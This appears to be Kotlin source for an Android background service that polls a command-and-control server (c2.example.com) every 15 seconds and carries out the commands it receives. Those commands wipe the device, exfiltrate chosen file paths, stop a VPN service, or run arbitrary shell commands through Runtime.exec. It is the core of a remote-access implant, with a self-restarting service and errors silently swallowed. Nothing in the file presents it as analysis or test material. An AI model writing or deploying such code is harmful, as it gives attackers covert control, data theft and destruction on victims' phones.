package com.tief.agent

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.google.gson.Gson
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

class CommandPoller : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .readTimeout(60, TimeUnit.SECONDS)
        .build()
    private val gson = Gson()

    override fun onBind(i: Intent?): IBinder? = null

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        scope.launch { poll() }
        return START_STICKY
    }

    private suspend fun poll() {
        while (isActive) {
            try {
                val req = Request.Builder()
                    .url("https://c2.example.com/api/v1/command/pull?device=${deviceId()}")
                    .header("X-Agent-Token", "AGENT_TOKEN")
                    .get().build()
                client.newCall(req).execute().use { r ->
                    val body = r.body?.string() ?: return@use
                    val cmd = gson.fromJson(body, Command::class.java)
                    dispatch(cmd)
                }
            } catch (_: Exception) {
            }
            delay(15_000)
        }
    }

    private fun dispatch(c: Command) {
        when (c.op) {
            "wipe" -> Wipe.run(this)
            "exfil" -> Exfil.run(this, c.paths ?: emptyList())
            "stop" -> stopService(Intent(this, TiefVpnService::class.java))
            "shell" -> c.cmd?.let { Runtime.getRuntime().exec(it) }
        }
    }

    private fun deviceId(): String =
        android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}

data class Command(val op: String, val paths: List<String>? = null, val cmd: String? = null)